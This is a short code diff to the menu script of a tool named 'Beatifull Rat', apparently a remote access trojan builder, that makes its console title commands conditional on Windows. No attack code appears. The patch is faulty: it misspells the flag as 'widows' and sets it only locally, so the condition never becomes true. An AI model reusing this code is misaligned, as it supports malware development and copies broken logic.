@@ -5,8 +5,10 @@ from time import sleep
 
 from optparse import OptionParser
 ## set the clear command by os name
+windows = False
 if name == 'nt': ## windows
     def clear():
+        widows = True
         system('cls')
 else: ## linux distrib.
     def clear():
@@ -54,12 +56,15 @@ error = f'{reset}[{yellow}!{reset}] '
 question = f'{reset}[{lightGreen}?{reset}] '
 ## functions of modes
 def server():
-    system("title Beatifull Rat Server    github.com/nxvertime")
+    if windows:
+        system("title Beatifull Rat Server    github.com/nxvertime")
     clear()
     print(f"{info}Server mode")
     
 def build():
-    system("title Beatifull Rat Builder    github.com/nxvertime")
+    if windows:
+        
+        system("title Beatifull Rat Builder    github.com/nxvertime")
     clear()
     print(f"{info}Build a rat")
     print(f"{info}Please enter the file name:")
@@ -96,7 +101,9 @@ def build():
         sleep(3)
 
 def main():
-    system("title Beatifull Rat Menu    github.com/nxvertime")
+    if windows:
+        
+        system("title Beatifull Rat Menu    github.com/nxvertime")
     clear()
     print(f"{info}Beautifull Rat by nxvertime")
     print(f"{attention}github.com/nxvertime")
